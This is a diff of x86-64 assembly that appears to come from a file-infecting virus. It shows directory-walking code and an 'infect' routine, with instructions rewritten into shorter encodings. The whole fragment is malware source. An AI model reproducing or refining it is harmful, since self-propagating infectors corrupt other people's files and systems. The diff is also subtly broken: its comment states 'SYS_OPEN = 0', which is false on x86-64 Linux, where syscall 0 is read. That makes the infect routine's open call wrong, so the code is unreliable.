@@ -18,7 +18,7 @@ _start:
     lea     rdi, [rel cwd]
     mov     rsi, O_DIRECTORY | O_RDONLY
     xor     eax, eax
-    add     eax, SYS_OPEN
+    add     al, SYS_OPEN
     syscall
     mov     [rsp], eax
     lea     rdi, [rel dir1]
@@ -26,7 +26,8 @@ _start:
     lea     rdi, [rel dir2]
     call    readdir
     mov     edi, [rsp]
-    mov     eax, SYS_FCHDIR
+    xor     eax, eax
+    add     al, SYS_FCHDIR
     syscall
     mov     edi, [rsp]
     xor     eax, eax
@@ -55,14 +56,16 @@ readdir:
 
     xor     rdi, rdi
     mov     rsi, 0x1000
-    mov     rdx, PROT_READ | PROT_WRITE
+    add     rdx, PROT_READ | PROT_WRITE
     mov     r10, MAP_ANONYMOUS | MAP_PRIVATE
-    mov     r8, -1
+    xor     r8, r8
+    dec     r8
     xor     r9, r9
-    mov     eax, SYS_MMAP
+    xor     eax, eax
+    add     al, SYS_MMAP
     syscall
-    cmp     rax, 0xffffffffffffff00
-    ja      end_readdir
+    test    al, al
+    jnz     end_readdir
     mov     [rsp + 0x8], rax
 
 loop_dir:
@@ -105,7 +108,7 @@ infect:
     mov     [rsp + filename], rdi
 
     mov     esi, O_RDWR
-    mov     eax, SYS_OPEN
+    xor     eax, eax ; SYS_OPEN = 0
     syscall
     test    eax, eax
     js      quit_infect
